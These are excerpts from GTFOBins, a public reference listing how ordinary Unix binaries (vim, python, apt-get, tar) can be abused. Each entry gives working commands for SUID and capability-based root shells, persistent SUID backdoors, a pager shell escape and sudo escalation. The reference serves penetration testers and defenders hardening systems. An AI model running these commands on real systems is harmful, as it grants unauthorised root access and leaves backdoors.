# GTFOBins

[https://gtfobins.github.io/](https://gtfobins.github.io/)

## vim

[https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)

...

### SUID
If the binary has the `SUID` bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a `SUID` backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default sh shell to run with `SUID` privileges.

This example creates a local `SUID` copy of the binary and runs it to maintain elevated privileges. To interact with an existing `SUID` binary skip the first command and run the program using its original path.

This requires that vim is compiled with `Python` support. Prepend `:py3` for `Python 3`.

```bash
sudo install -m =xs $(which vim) .

./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

## python

[https://gtfobins.github.io/gtfobins/python/](https://gtfobins.github.io/gtfobins/python/)

...

### SUID
If the binary has the `SUID` bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a `SUID` backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default sh shell to run with `SUID` privileges.

This example creates a local `SUID` copy of the binary and runs it to maintain elevated privileges. To interact with an existing `SUID` binary skip the first command and run the program using its original path.

```bash
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities
If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process `UID`.

```bash
cp $(which python) .
sudo setcap cap_setuid+ep python

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```


## apt-get
[https://gtfobins.github.io/gtfobins/apt-get/](https://gtfobins.github.io/gtfobins/apt-get/)

...

### Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

This invokes the default pager, which is likely to be less, other functions may apply.

```bash
apt-get changelog apt
!/bin/sh
```
...

## tar

[https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)

...

### Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```